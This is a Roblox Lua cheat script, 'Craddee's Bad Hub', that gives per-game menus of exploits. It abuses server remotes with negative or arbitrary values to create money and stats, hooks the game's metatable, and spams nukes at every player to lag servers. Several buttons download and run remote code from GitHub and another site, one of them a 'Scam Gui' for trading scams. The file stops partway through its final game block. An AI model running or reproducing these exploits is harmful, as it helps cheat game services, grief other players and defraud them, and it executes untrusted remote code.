local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Craddee's Bad Hub", "Ocean")
-- Variables
local SmallTick = 0.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001
local Tick = 0.00000000000000000000000000000000000000000000000000000000000000000000000001
local BigsmallTick = 0.00000000000000000000000001
local BigTick = 0.00000001
local TheInf = (5/0)
local SmallBigNumber = 99999
local VeryHugeNumber = math.pow (SmallBigNumber, 61)
local HugerNumber = math.pow (SmallBigNumber, 29)
local HugeNumber = math.pow (SmallBigNumber, 3)
local MathHuge = math.huge
local localplayer = game.Players.LocalPlayer
local newPlayerList
-- print("View Variable Values: ", SmallTick, Tick, BigsSmallTick, BigTick, TheInf, SmallBigNumber, VeryHugeNumber, HugerNumber, HugeNumber, MathHuge)
-- AllPlayers
local function RefreshPlayerList()
    newPlayerList = {}
    for i, player in pairs(game:GetService("Players"):GetPlayers()) do
        newPlayerList[i] = player.Name
    end
end
RefreshPlayerList()

local function findFirstString(table, str)
    for index, value in ipairs(table) do
        if value == str then
            return index
        end
    end
    return nil, nil
end

if game.PlaceId == 8508161757 then
    -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main Stuffs")

    MainSection:NewButton("AutoSpawn Tips CashBag", "Must have Tip Jar!", function()
        AutoTipCashBag = true
        while AutoTipCashBag == true do
            game.ReplicatedStorage.CashBags.TipCashBag:FireServer()
            wait(tick)
        end
    end)

    MainSection:NewButton("Stop AutoTipFarm", "Must have Tip Jar!", function()
        AutoTipCashBag = false
    end)

    MainSection:NewButton("AutoSpawn Bath CashBag", "Must have Bath!", function()
        AutoBathCashBag = true
        while AutoBathCashBag == true do
            game.ReplicatedStorage.CashBags.BathCashBag:FireServer()
            wait(tick)
        end
    end)

    MainSection:NewButton("Stop AutoBathFarm", "Must have Bath!", function()
        AutoBathCashBag = false
    end)
end
    
    if game.PlaceId == 413053960 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local StatSection = Main:NewSection("Stats")

    StatSection:NewTextBox("Set Strength", "TextboPress Enter After ValuexInfo", function(STRENGTH)
        game.Players.LocalPlayer.RemoteFunctions.UR_ANTIHACK:FireServer("Strength", "one", STRENGTH, 2)
    end)

    StatSection:NewTextBox("Set Loot", "Press Enter After Value", function(LOOT)
        game.Players.LocalPlayer.RemoteFunctions.UR_ANTIHACK:FireServer("Loot", "one", LOOT, 2)
    end)

    StatSection:NewTextBox("Set Health", "Press Enter After Value", function(HEALTH)
        game.Players.LocalPlayer.RemoteFunctions.UR_ANTIHACK:FireServer("Health", "one", HEALTH, 2)
    end)

    local MoneySection = Main:NewSection("Money")

    MoneySection:NewTextBox("Add Money", "Press Enter After Value", function(Money)
        Cash = Money/2
        game.Players.LocalPlayer.RemoteFunctions.SwordSystem:FireServer("Buy", "Gold", -Cash, "Iron")
        wait(0.3)
        game.Players.LocalPlayer.RemoteFunctions.SwordSystem:FireServer("Sell", "Gold", Cash, "Iron")
        game.Players.LocalPlayer.RemoteFunctions.SwordSystem:FireServer("Sell", "Gold", Cash, "Iron")
        game.Players.LocalPlayer.RemoteFunctions.SwordSystem:FireServer("Sell", "Gold", Cash, "Iron")
    end)

    local MiscSection = Main:NewSection("Misc")

    MiscSection:NewButton("GodMode", "ONLY WORKS IN SPAWN", function()
        game.Players.LocalPlayer.RemoteFunctions.UR_ANTIHACK:FireServer("Health", "one", HugeNumber, 2)
    end)

    MiscSection:NewButton("GodMode NPC", "HIT A NPC TO GIVE IT GODMODE", function()
        game.Players.LocalPlayer.RemoteFunctions.UR_ANTIHACK:FireServer("Strength", "one", HugeNumber, 2)
    end)

    MiscSection:NewButton("Reset Gold", "KILL A NPC TO RESET GOLD", function()
        game.Players.LocalPlayer.RemoteFunctions.UR_ANTIHACK:FireServer("Loot", "one", HugeNumber, 2)
    end)
end

    if game.PlaceId == 60654525 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("Add Money", "Press Enter After Value", function(Money)
        MoneyDivided = Money/2
        game.Players.LocalPlayer.RemoteFunctions.SwordSystem:FireServer("Buy", -MoneyDivided, "Steel")
        wait(0.3)
        game.Players.LocalPlayer.RemoteFunctions.SwordSystem:FireServer("Sell", MoneyDivided, "Steel")
        game.Players.LocalPlayer.RemoteFunctions.SwordSystem:FireServer("Sell", MoneyDivided, "Steel")
        game.Players.LocalPlayer.RemoteFunctions.SwordSystem:FireServer("Sell", MoneyDivided, "Steel")
    end)
end

if game.PlaceId == 4839647441 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("Add Money", "Press Enter After Value, put money in money collector", function(Money)
        game.ReplicatedStorage.updateCollector:FireServer(Money)
    end)
end
if game.PlaceId == 5775214331 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")
    local MainSection = Main:NewSection("GLITCHY, REJOIN TO CHANGE MULTIPLE TIMES!")

    MainSection:NewTextBox("Money Hack", "Press Enter After Value, makes stone work whatever u want", function(Money)
        local meta = getrawmetatable(game)
        local old = meta.__namecall
        setreadonly(meta,false)
        function meta:__namecall(...)
        local args = {...}
        if self == game.ReplicatedStorage.Events.DropSell then
        args[1] = Money
        return old(self,unpack(args))
        end
        return old(self,...)
        end
    end)
end
if game.PlaceId == 2110185000 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")
    local MainSection = Main:NewSection("use knife each time you do this!!!")

    MainSection:NewTextBox("Money Hack", "Press Enter After Value, then sell", function(Monw)
        moewn = Monw/5
        on = 1
        function codeW()
        local plrN = game.Players.LocalPlayer.Name
        for i,Base in pairs(game.Workspace.Fields[plrN].LastField:GetChildren()) do
        if Base.Name == "BASE" and on == 1 then
        for x,Crop in pairs(Base:GetChildren()) do
        local A_1 = game:GetService("Workspace").Fields[plrN].LastField.BASE[Crop.Name]
        local A_2 = game:GetService("Workspace")[plrN].Knife
        local A_3 = moewn
        local Event = game:GetService("ReplicatedStorage").ToolEvents.Rem
        Event:FireServer(A_1, A_2, A_3)
        wait()
        end
        end
        end
        end
        function codeB()
        local plrN = game.Players.LocalPlayer.Name
        for i,Base in pairs(game.Workspace.Fields[plrN].LastField:GetChildren()) do
        if Base.Name == "BASE" and on == 1 then
        for x,Crop in pairs(Base:GetChildren()) do
        local A_1 = game:GetService("Workspace").Fields[plrN].LastField.BASE[Crop.Name]
        local A_2 = game:GetService("Players")[plrN].Backpack.Knife
        local A_3 = moewn
        local Event = game:GetService("ReplicatedStorage").ToolEvents.Rem
        Event:FireServer(A_1, A_2, A_3)
        wait()
        end
        end
        end
        end

        local good,bad = pcall(codeW)
        if good then 
            codeW()
        else
            local good,bad = pcall(codeB)
            if good then
                codeB()
            else 
                wait()
            end
        end
    end)
end
if game.PlaceId == 2599583795 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("Money", "Press Enter After Value, Money Put In Money Collector", function(Monrde)
        game.ReplicatedStorage.Storage.RemoteServices.TycoonService.Smelt:FireServer(Monrde)
    end)
end

if game.PlaceId == 4301313353 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("Money", "Press Enter After Value, Money Put In Money Collector", function(Monrder)
        game.ReplicatedStorage.updateCollector:FireServer(Monrder)
    end)
end

if game.PlaceId == 4301321281 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("Money", "Press Enter After Value, Money Put In Money Collector", function(Monrder)
        game.ReplicatedStorage.updateCollector:FireServer(Monrder)
    end)
end

if game.PlaceId == 9461798258 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Inf Money", "Press then you will get money", function()
        while task.wait() do
            local event = game:GetService("ReplicatedStorage").cleanPoop
            event:FireServer()
            local event = game:GetService("ReplicatedStorage").SaveGame
            event:FireServer()
            end
    end)

    MainSection:NewButton("Inf Mad", "Press then you will get mad", function()
        local args = {
            [1] = game:GetService("ReplicatedStorage").Upgrades.maid
         }
         
         game:GetService("ReplicatedStorage").buyUpgrade:FireServer(unpack(args))
    end)

    MainSection:NewButton("Inf Cookies", "Press then you will get cookies", function()
        local args = {
            [1] = game:GetService("ReplicatedStorage").Items.food
         }
         
         game:GetService("ReplicatedStorage").buyTool:FireServer(unpack(args))
         for i,v in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
           if v:IsA("Tool")  then
            wait()
            v.Parent = game.Players.LocalPlayer.Character
            wait()
            v.Parent = game.Workspace
         end
         end
    end)
end

if game.PlaceId == 9438506890 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("Add Money", "Press Enter After Value", function(Maern)
        game.ReplicatedStorage.Remotes.BuyFood:FireServer(-Maern)
    end)
end

if game.PlaceId == 6668183009 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("Money", "Press Enter After Value, Money Put In Money Collector", function(Monera)
        game.ReplicatedStorage.Shop:FireServer("Buy", "J", -Monera)
    end)
end

if game.PlaceId == 6668183009 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

    MiscSection:NewButton("SEE PAINTINGS WORTH", "Press F9 and look at warnings", function()
       local DevConsole = game:GetService("CoreGui"):WaitForChild("DevConsoleMaster")
local Window = DevConsole.DevConsoleWindow
local UI = Window.DevConsoleUI
local MainView = UI:WaitForChild("MainView")
local ClientLog = MainView:WaitForChild("ClientLog")

local GetHighest = function(...)
local HighestValue
for _, Value in next, ... do
if not HighestValue or Value > HighestValue then
HighestValue = Value
end
end
return HighestValue
end

local CPrint = function(...)
local Args = {...}
local TempColour = table.remove(Args)
local Colour
if typeof(TempColour) == "Color3" then
Colour = TempColour
else
Colour = Color3.fromRGB(255,255,255)
table.insert(Args, TempColour)
end
local CandidParts = {}
for _, Element in next, ClientLog:GetChildren() do
local Name = Element.Name
if Name:match("%d+") then
table.insert(CandidParts, tonumber(Element.Name))
end
end
   local Expecting = GetHighest(CandidParts)
   Expecting = Expecting and (Expecting + 1) or (2)
   print(unpack(Args))
local ExpectedPart = ClientLog:WaitForChild(Expecting)
   local MessagePart = ExpectedPart:FindFirstChild("msg")
   if MessagePart then
       MessagePart.TextColor3 = Colour
   end
end

-- Script Made by Unordinary
for i,v in pairs(game:GetService("ReplicatedStorage").PlayerInfo:GetDescendants()) do
    if v.Name == "1" or v.Name == "2" or v.Name == "3" then
        CPrint(v.Value, Color3.fromRGB(0,255,109))
        wait()
    end
end 
    end)
end

if game.PlaceId == 9711536246 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("Add Coins", "Press Enter After Value", function(KiaCoin)
        game.ReplicatedStorage.PointManager.AddValue:FireServer("Coin", KiaCoin)
    end)
end

if game.PlaceId == 7034960857 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("Add Coins", "Press Enter After Value", function(Coin)
        local args = {
            [1] = "JJ-DX-01-BBL-18",
            [2] = -Coin
        }

        game:GetService("ReplicatedStorage").Remotes.BuyDragonEvent:FireServer(unpack(args))
    end)
end

if game.PlaceId == 4325400580 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")
    rebirthFarm = false
    NukeOnEBool = false

    MainSection:NewDropdown("Set Color", "Color / Team gamepasses for free", {"Default", "Black", "Desert"}, function(Color)
        local Skin_Name = "Default"
        game:GetService("ReplicatedStorage").RE.changeSkins:FireServer(Color)
    end)

    MainSection:NewButton("Kill all enemy units", "Kill all the enemy units", function()
        for i,v in pairs(game.Workspace.Game.Units:GetChildren()) do
            if v.Name == game.Players.LocalPlayer.Name then
            else
            for i,v2 in pairs(v:GetChildren()) do
            local Missile = "Cruise Missile"
            local Position = v2.Torso.Position
            game:GetService("ReplicatedStorage").RE.FireMissile:FireServer(Missile, Position)
            end
            end
            end
    end)

    RebirthFarmButton = MainSection:NewButton("Rebirth Farm (off)", "Farm rebirths", function()
        rebirthFarm = not rebirthFarm

        if rebirthFarm == true then
            RebirthFarmButton:UpdateButton("Rebirth Farm (on)")
        else 
            RebirthFarmButton:UpdateButton("Rebirth Farm (off)")
        end
    end)

    MainSection:NewButton("Max Base", "Max out ur base", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/refs/heads/main/ArmyTycoon1.lua"))()
    end)

    MainSection:NewButton("Give all max base (PATCHED)", "Give everyone in the server a max base", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/refs/heads/main/MaxbaseeveryoneArmyTycoon.lua"))()           
    end)

    MainSection:NewButton("Capture All", "Capture / Claim all bases", function()
        for i,v in pairs(game.Workspace.Game.Base.Interactives:GetChildren()) do
            game:GetService("ReplicatedStorage").RE.StartCapturing:FireServer(v, true)
            end            
    end)

    NukeEButton = MainSection:NewButton("Press E to launch nuke (off)", "launches nuke at mouse when u press E", function()
        NukeOnEBool = not NukeOnEBool

        if NukeOnEBool then
            NukeEButton:UpdateButton("Press E to launch nuke (on)")
        else
            NukeEButton:UpdateButton("Press E to launch nuke (off)")
        end
    end)
    

    MainSection:NewButton("Lag Players", "Drops nuked to all palyers for free", function()
        while true do
            for i,v in pairs(game.Players:GetChildren()) do
             targetPos = v.Character.HumanoidRootPart.Position
             game.ReplicatedStorage.RE.FireMissile:FireServer("Nuke",targetPos)
             game.ReplicatedStorage.RE.FireMissile:FireServer("Nuke",targetPos)
             game.ReplicatedStorage.RE.FireMissile:FireServer("Nuke",targetPos)
             game.ReplicatedStorage.RE.FireMissile:FireServer("Nuke",targetPos)
             game.ReplicatedStorage.RE.FireMissile:FireServer("Nuke",targetPos)
             game.ReplicatedStorage.RE.FireMissile:FireServer("Nuke",targetPos)
             game.ReplicatedStorage.RE.FireMissile:FireServer("Nuke",targetPos)
             game.ReplicatedStorage.RE.FireMissile:FireServer("Nuke",targetPos)
            end
        end           
    end)

    local MainSection = Main:NewSection("Max Base Anyone (PATCHED)")
    local playerList = MainSection:NewDropdown("Max Base", "Give a MaxedOut base to anyone!", newPlayerList, function(Victim)
        RefreshPlayerList()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/MaxBaseAnyoneArmyTycoon.lua",true))(Victim)
    end)

    MainSection:NewButton("Refresh player list", "Refreshes player list", function()
        RefreshPlayerList()
        playerList:Refresh(newp)
    end)

    function NukeOnE()
        game:GetService("UserInputService").InputBegan:Connect(function(input, gpe)
            if not gpe and input.KeyCode == Enum.KeyCode.E then
                if NukeOnEBool then
                    local mouse = game.Players.LocalPlayer:GetMouse()
                    game:GetService("ReplicatedStorage").RE.FireMissile:FireServer("Nuke", Vector3.new(mouse.Hit.p.X, 48.6649132, mouse.Hit.p.Z))
                end
            end
        end)
    end
    NukeOnE()

    function RebirthFarmFunction()
        game:GetService("UserInputService").InputBegan:Connect(function(input, gpe)
            while rebirthFarm == true do
                loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/refs/heads/main/ArmyTycoon1.lua"))()
                game:GetService("ReplicatedStorage").RE.rebirth:FireServer()
                wait(.15)
                loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/refs/heads/main/ArmyTycoon1.lua"))()
                wait(0.3)
            end
        end)
    end
    RebirthFarmFunction()
end

if game.PlaceId == 2955597371 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Inf Oxygen", "Dont drown and have inf Air / Oxygen", function()
        game:GetService("Players").LocalPlayer.Data.Passes.xInfiniteOxygen.Value=true         
    end)

    MainSection:NewButton("Catch All Fish", "Capture fish", function()
        for i,v in pairs(game:GetService("Workspace").Animals:GetChildren())do
            game.ReplicatedStorage.RemoteEvents.RemoteCollectFish:FireServer(v)
            end          
    end)

    MainSection:NewButton("Auto Upgrade Tills", "Auto Upgrade Tills", function()
        while wait(1) do
            for i=1,4 do game.ReplicatedStorage.RemoteEvents.UpgradeTillEvent:InvokeServer("Till"..tostring(i))end    
            end         
    end)
end

if game.PlaceId == 6668183009 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("Money", "Press Enter After Value", function(Moneraa)
        local args = {
            [1] = "First",
            [2] = Moneraa
        
        }
        
        game:GetService("ReplicatedStorage").RE.ticket:FireServer(unpack(args))
    end)
end

if game.PlaceId == 6198039277 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Inf Money", "Get money very fast", function()
        local rs = game:GetService("RunService")

        game.Players.LocalPlayer.PlayerGui.OnScreen.Stats.Pstat.ChildAdded:Connect(function(v)
            if v.Name == "PopUp" then
                rs.RenderStepped:wait()
                v:Destroy()
            end
        end)
        
        rs.RenderStepped:Connect(function()
            for i = 1, 3 do
                game.ReplicatedStorage.RE.Robbery:FireServer()
            end
        end)       
    end)
end

if game.PlaceId == 2608219442 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Nice Autofarm", "Nice but laggy autofarm", function()
        for i,v in pairs (game:GetService("Workspace").Absorbable:GetChildren()) do
            v.CFrame = game:GetService("Players").LocalPlayer.character.HumanoidRootPart.CFrame
            end     
    end)
end

if game.PlaceId == 4064108474 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("Add Money", "Press Enter After Value", function(Monerty)
        game.ReplicatedStorage.RE.moneychange:FireServer(Monerty)
    end)

    MainSection:NewTextBox("Add EXP", "Press Enter After Value", function(ThatEXP)
        game.ReplicatedStorage.RE.addXP:FireServer(ThatEXP)
    end)
end

if game.PlaceId == 3203888787 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("Add Money", "Press Enter After Value", function(Monertyy)
        game.ReplicatedStorage.RE.moneychange:FireServer(Monertyy)
    end)

    MainSection:NewTextBox("Add EXP", "Press Enter After Value", function(ThatEXPP)
        game.ReplicatedStorage.RE.addXP:FireServer(ThatEXPP)
    end)
end

if game.PlaceId == 2848994117 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("Add Money", "Press Enter After Value", function(Monertyye)
        game.ReplicatedStorage.RE.moneychange:FireServer(Monertyye)
    end)

    MainSection:NewTextBox("Add People", "Press Enter After Value", function(ppl)
        game.ReplicatedStorage.RE.addXP:FireServer(ppl)
    end)
end

if game.PlaceId == 7346416636 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Scam Gui", "Gui with scam scripts, not made by me", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/scamguipopittrading.lua",true))()   
    end)
end

if game.PlaceId == 6717367660 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Inf Money", "Get Inf Money", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/happyland.lua",true))()  
    end)
end

if game.PlaceId == 6717367660 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Pink X GUI", "open a Roblox GUI", function()
        loadstring(game:HttpGet("https://drizzy.wtf//PinkX/Script"))()  
    end)
end

if game.PlaceId == 9415202048 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewDropdown("Equips item", "All items listed so far", {"BloxyCola", "Noodle", "BANG!", "Moneybag", "GravityCoil", "Tixbomb", "Railgun", "InvisibilityCape", "BlowDryer", "Darkheart", "Godly Fists"}, function(ItemDropDown)
        local args = {
            [1] = ItemDropDown
        }
        
        game:GetService("ReplicatedStorage").Remotes.equipToolEvent:FireServer(unpack(args))
    end)

    MainSection:NewTextBox("Equipt item (More Items)", "Use if item is not listed on first 1", function(ItemText)
        local args = {
            [1] = ItemText
        }
        
        game:GetService("ReplicatedStorage").Remotes.equipToolEvent:FireServer(unpack(args))
    end)
end

if game.PlaceId == 218377574 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("AutoLift", "nice simple AutoLift", function()
        DoAutoLift = true
        while DoAutoLift == true do
            game:GetService("ReplicatedStorage").Remotes.Lift:FireServer()
            wait(Tick)
            end   
    end)

    MainSection:NewButton("Stop AutoLift", "Stops AutoLift", function()
        DoAutoLift = false
    end)
end

if game.PlaceId == 9739506878 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("AutoLift", "nice simple AutoLift", function()
        DoAutoLift = true
        while DoAutoLift == true do
            game:GetService("ReplicatedStorage").Remotes.Lift:FireServer()
            wait(Tick)
            end   
    end)

    MainSection:NewButton("Stop AutoLift", "Stops AutoLift", function()
        DoAutoLift = false
    end)
end

if game.PlaceId == 10135321551 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("AutoLift", "nice simple AutoLift", function()
        DoAutoLift = true
        while DoAutoLift == true do
            game:GetService("ReplicatedStorage").Remotes.Lift:FireServer()
            wait(Tick)
            end   
    end)

    MainSection:NewButton("Stop AutoLift", "Stops AutoLift", function()
        DoAutoLift = false
    end)
end

if game.PlaceId == 10144942022 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("AutoLift", "nice simple AutoLift", function()
        DoAutoLift = true
        while DoAutoLift == true do
            game:GetService("ReplicatedStorage").Remotes.Lift:FireServer()
            wait(Tick)
            end   
    end)

    MainSection:NewButton("Stop AutoLift", "Stops AutoLift", function()
        DoAutoLift = false
    end)
end

if game.PlaceId == 10135223315 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("AutoLift", "nice simple AutoLift", function()
        DoAutoLift = true
        while DoAutoLift == true do
            game:GetService("ReplicatedStorage").Remotes.Lift:FireServer()
            wait(Tick)
            end   
    end)

    MainSection:NewButton("Stop AutoLift", "Stops AutoLift", function()
        DoAutoLift = false
    end)
end

if game.PlaceId == 10135914792 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("AutoLift", "nice simple AutoLift", function()
        DoAutoLift = true
        while DoAutoLift == true do
            game:GetService("ReplicatedStorage").Remotes.Lift:FireServer()
            wait(Tick)
            end   
    end)

    MainSection:NewButton("Stop AutoLift", "Stops AutoLift", function()
        DoAutoLift = false
    end)
end

if game.PlaceId == 10001513103 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewTextBox("GetCodePrize", "Enter The Code, DONT SPAM", function(CodeToUse)
    local args = {
        [1] = CodeToUse,
        [2] = "set"
    }
    
    game:GetService("ReplicatedStorage").CodeCheck:InvokeServer(unpack(args))
    
    local args = {
        [1] = CodeToUse
    }
    game:GetService("ReplicatedStorage").Code:InvokeServer(unpack(args))
    
    local args = {
        [1] = CodeToUse,
        [2] = "check"
    }
    game:GetService("ReplicatedStorage").CodeCheck:InvokeServer(unpack(args))
    end)
end

if game.PlaceId == 9718523719 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("autoclick noob", "NoobieClick?", function()
        AutoClickNoob = true
        while AutoClickNoob == true do
            game:GetService("ReplicatedStorage").ClickNoob:FireServer()
            wait(0.000001)
            end 
    end)

    MainSection:NewButton("stop autonoob", "No NoobieClick", function()
        AutoClickNoob = false
    end)
end

if game.PlaceId == 8884334497 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("OP Autoclick", "Wassup im B O R E D", function()
        DoAutoclick = true
        while DoAutoclick == true do
            game:GetService("ReplicatedStorage").Remotes.Click:InvokeServer()
            end
    end)

    MainSection:NewButton("Stop Autoclick", "Stops OP Autoclick", function()
        DoAutoclick = false
    end)
end

if game.PlaceId == 920587237 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("make all pets FR (Client)", "rejoin to undo", function()
        local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
        local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
        for i,v in pairs(playerData.inventory.pets) do
        v.properties.rideable = true
        v.properties.flyable = true
        end
    end)
end

if game.PlaceId == 9498006165 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("OP Autoclick", "S p a c e B a r", function()
        DoAutoclick = true
        while DoAutoclick == true do
            game:GetService("ReplicatedStorage").Events.Tap:FireServer()
            wait(Tick)
        end
    end)

    MainSection:NewButton("Stop Autoclick", "Stops OP Autoclick", function()
        DoAutoclick = false
    end)
end

if game.PlaceId == 3686253681 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Auto Mass", "M A S S", function()
        DoAutoMass = true
        while DoAutoMass == true do
            local args = {
                [1] = "Mass",
                [2] = VeryHugeNumber
            }
            game:GetService("ReplicatedStorage").ChangePlayerStat:FireServer(unpack(args))
            wait(SmallTick)
        end
    end)

    MainSection:NewButton("Stop Auto Mass", "Stops AutoMass", function()
        DoAutoMass = false
    end)

    MainSection:NewButton("Auto SuperNova", "Super! Nova!", function()
        DoAutoSuperNova = true
        while DoAutoSuperNova == true do
            game:GetService("ReplicatedStorage").GoSupernova:FireServer()
            wait(BigTick)
        end
    end)

    MainSection:NewButton("Auto SuperNova", "Stops AutoSuperNova", function()
        DoAutoSuperNova = false
    end)
end

if game.PlaceId == 8750997647 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Autoclick", "Be Autoclicking", function()
        Autoclick = true
        while Autoclick == true do
            game:GetService("ReplicatedStorage").Remotes.Tap:FireServer()
            wait(Tick)
        end
    end)

    MainSection:NewButton("Stop Autoclick", "Stops Autoclick", function()
        DoAutoclick = false
    end)

    MainSection:NewButton("Auto Rebirth", "Auto Rebirths", function()
        DoAutoRebirth = true
        while DoAutoRebirth == true do
            local args = {
                 [1] = 1
            }
            game:GetService("ReplicatedStorage").Remotes.Rebirth:FireServer(unpack(args))
            wait(BigTick)
        end
    end)

    MainSection:NewButton("Stop Auto Rebirth", "Stops Auto Rebirth", function()
        DoAutoRebirth = false
    end)
end

if game.PlaceId == 10108131074 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewTextBox("Auto Grass - Read Desc", "your most unlocked world by numbers", function(World)
    DoAutoGrass = true
    while DoAutoGrass == true do
        local args = {
            [1] = "1"
        }
        game:GetService("ReplicatedStorage").Remotes.Game.ClientMowGrass:FireServer(unpack(args))
        wait(BigTick)
        end
    end)

MainSection:NewButton("Stop Auto Grass", "Stops AutoGrass", function()
        DoAutoGrass = false
    end)

MainSection:NewButton("Fill Gas", "Fills up gas", function()

    local args = {
    [1] = workspace.Map.Zones:FindFirstChild("1"):FindFirstChild("1").GasStation.GasPumps,
    [2] = true
    }
    game:GetService("ReplicatedStorage").Remotes.Game.ClientToggleUseGasStation:FireServer(unpack(args))

    end)

MainSection:NewButton("Auto Fill Gas", "Basiclly Inf Gas", function()
    AutoGas = true
    while AutoGas == true do
        local args = {
        [1] = workspace.Map.Zones:FindFirstChild("1"):FindFirstChild("1").GasStation.GasPumps,
        [2] = true
        }
        game:GetService("ReplicatedStorage").Remotes.Game.ClientToggleUseGasStation:FireServer(unpack(args))
        wait(BigTick)
        end
    end)

MainSection:NewButton("Stop Auto Fill Gas", "Stops Auto Gas", function()
    AutoGas = false
    end)
end

if game.PlaceId == 10439131644 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewTextBox("Add Candy", "Adds candy", function(Candy)
    local args = {
        [1] = "JoeyMcFlowey",
        [2] = Candy
    }
    game:GetService("ReplicatedStorage").Droptopla:FireServer(unpack(args))
    end)
end

if game.PlaceId == 9185412259 then
    -- MAIN
